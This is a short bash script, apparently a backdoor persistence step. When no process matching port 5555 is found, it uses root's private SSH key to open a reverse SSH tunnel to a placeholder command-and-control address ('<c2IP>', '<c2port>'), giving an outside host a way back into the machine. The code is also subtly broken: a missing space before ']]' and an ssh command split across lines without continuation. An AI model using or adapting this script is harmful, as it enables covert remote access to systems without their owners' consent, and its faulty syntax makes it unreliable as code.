#!/bin/bash

if [[ $(ps -ef | grep -c 5555) -eq 1]]; then
/usr/bin/ssh -i /root/.ssh/id_rsa -nNT -R
5555:localhost:<c2port> <c2IP>
fi